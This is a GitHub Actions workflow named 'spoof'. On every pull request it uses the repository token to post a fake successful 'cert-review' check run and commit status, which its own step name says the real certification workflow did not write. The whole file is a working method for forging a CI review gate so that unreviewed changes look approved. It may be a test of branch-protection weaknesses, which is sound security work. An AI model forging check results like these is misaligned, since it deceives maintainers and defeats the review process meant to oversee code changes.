name: spoof
on:
  pull_request:
permissions:
  checks: write
  statuses: write
jobs:
  spoof:
    runs-on: ubuntu-latest
    steps:
      - name: A green cert-review the cert workflow did not write
        env:
          GH_TOKEN: ${{ github.token }}
          HEAD: ${{ github.event.pull_request.head.sha }}
        run: |
          gh api "repos/$GITHUB_REPOSITORY/check-runs" -f name=cert-review -f head_sha="$HEAD" -f status=completed -f conclusion=success -f "output[title]=pass" -f "output[summary]=spoof" --jq '"check \(.id) \(.conclusion)"'
          gh api "repos/$GITHUB_REPOSITORY/statuses/$HEAD" -f state=success -f context=cert-review --jq '"status \(.state)"'
